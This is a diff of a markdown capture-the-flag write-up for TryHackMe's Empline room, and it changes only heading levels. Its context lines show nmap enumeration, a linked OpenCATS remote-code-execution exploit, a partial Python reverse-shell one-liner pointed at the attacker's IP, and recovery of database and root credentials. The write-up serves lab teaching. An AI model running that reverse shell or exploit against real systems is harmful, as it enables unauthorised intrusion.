@@ -13,13 +13,13 @@ img_path: /assets/img/tryhackme/empline
 ---
 
 
-# **Description**
+## **Description**
 
 Hello hackers, I hope you are doing well. We are doing [Empline](https://tryhackme.com/room/empline) from [TryHackMe](https://tryhackme.com).
 
-# **Enumeration**
+## **Enumeration**
 
-## nmap
+### nmap
 
 We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.
 
@@ -70,7 +70,7 @@ We found 3 open ports:
 
 We don't have any credentials for ssh and mysql so let's enumerate the http web server.
 
-## Web
+### Web
 
 Navigate to the web page.
 
@@ -87,7 +87,7 @@ Now let's go to http://job.empline.thm/
 We found a login page for `opencats` version 0.9.4 . 
 
 
-# **Foothold**
+## **Foothold**
 
 I searched on google for available exploit and found this [remote code execution exploit](https://github.com/Nickguitar/RevCAT).
 
@@ -105,7 +105,7 @@ export RHOST="10.11.14.124";export RPORT=9001;python3 -c 'import sys,socket,os,p
 
 ![](5.png)
 
-# **Privilege Escalation**
+## **Privilege Escalation**
 
 Checking `opencats` config file i managed to find mysql credentials.
 
@@ -205,7 +205,3 @@ Now we can switch to root with the password `password`.
 ---
 
 Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
-
----
-
-# References
